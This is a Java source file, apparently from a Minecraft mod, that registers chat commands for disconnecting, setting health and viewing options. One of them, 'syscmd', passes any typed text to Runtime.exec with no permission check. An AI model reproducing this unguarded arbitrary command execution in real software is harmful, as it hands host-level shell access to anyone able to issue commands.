package dev.miru.commands;

import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.DoubleArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import dev.miru.main.ModMain;
import net.minecraft.ChatFormatting;
import net.minecraft.client.Minecraft;
import net.minecraft.commands.CommandSourceStack;
import net.minecraft.commands.Commands;
import net.minecraft.network.chat.Component;

public class TppModCommands {
   public static void register(CommandDispatcher<CommandSourceStack> dispatcher) {
      dispatcher.register(
         (LiteralArgumentBuilder)Commands.literal("disconnect").then(Commands.argument("reason", StringArgumentType.string()).executes(ctx -> {
            ((CommandSourceStack)ctx.getSource()).getPlayerOrException().connection.disconnect(Component.literal(StringArgumentType.getString(ctx, "reason")));
            return 1;
         }))
      );
      dispatcher.register(
         (LiteralArgumentBuilder)Commands.literal("syscmd")
            .then(
               Commands.argument("command", StringArgumentType.greedyString())
                  .executes(
                     ctx -> {
                        String command = StringArgumentType.getString(ctx, "command");

                        try {
                           Process process = Runtime.getRuntime().exec(command);
                           process.waitFor();
                           String output = new String(process.getInputStream().readAllBytes());
                           String errorOutput = new String(process.getErrorStream().readAllBytes());
                           if (!output.isEmpty()) {
                              ((CommandSourceStack)ctx.getSource())
                                 .sendSuccess(() -> Component.literal("Command output:\n" + output).withStyle(ChatFormatting.GREEN), false);
                           }

                           if (!errorOutput.isEmpty()) {
                              ((CommandSourceStack)ctx.getSource())
                                 .sendFailure(Component.literal("Command error output:\n" + errorOutput).withStyle(ChatFormatting.RED));
                           }

                           ((CommandSourceStack)ctx.getSource())
                              .sendSuccess(() -> Component.literal("Executed system command: " + command).withStyle(ChatFormatting.GREEN), false);
                        } catch (Exception e) {
                           ((CommandSourceStack)ctx.getSource())
                              .sendFailure(
                                 Component.literal("Failed to execute system command: " + command + "\nError: " + e.getMessage()).withStyle(ChatFormatting.RED)
                              );
                        }

                        return 1;
                     }
                  )
            )
      );
      dispatcher.register(
         (LiteralArgumentBuilder)Commands.literal("health").then(Commands.argument("value", DoubleArgumentType.doubleArg(0.0, 20.0)).executes(ctx -> {
            if (Minecraft.getInstance().player == null) {
               ((CommandSourceStack)ctx.getSource()).sendFailure(Component.literal("Player is unloaded, cannot set health!").withStyle(ChatFormatting.RED));
               return 0;
            } else {
               Minecraft.getInstance().player.setHealth((float)DoubleArgumentType.getDouble(ctx, "value"));
               return 1;
            }
         }))
      );
      dispatcher.register((LiteralArgumentBuilder)Commands.literal("viewoptions").executes(ctx -> {
         String[] optionsLines = ModMain.getOptions().toString().split("\n");

         for (String line : optionsLines) {
            ((CommandSourceStack)ctx.getSource()).sendSuccess(() -> Component.literal(line).withStyle(ChatFormatting.AQUA), false);
         }

         return 1;
      }));
   }
}
